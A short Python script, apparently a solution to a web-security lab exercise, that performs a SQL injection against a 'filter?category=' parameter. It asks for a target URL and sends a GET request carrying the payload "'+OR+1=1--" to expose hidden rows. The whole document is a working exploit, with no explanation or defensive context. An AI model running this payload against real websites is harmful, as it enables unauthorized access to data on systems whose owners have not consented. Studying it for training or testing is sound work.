# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
import requests
url = input("enter url : ")
path = "filter?category="
payload = "'+OR+1=1--"
r=requests.get(url+path+payload)
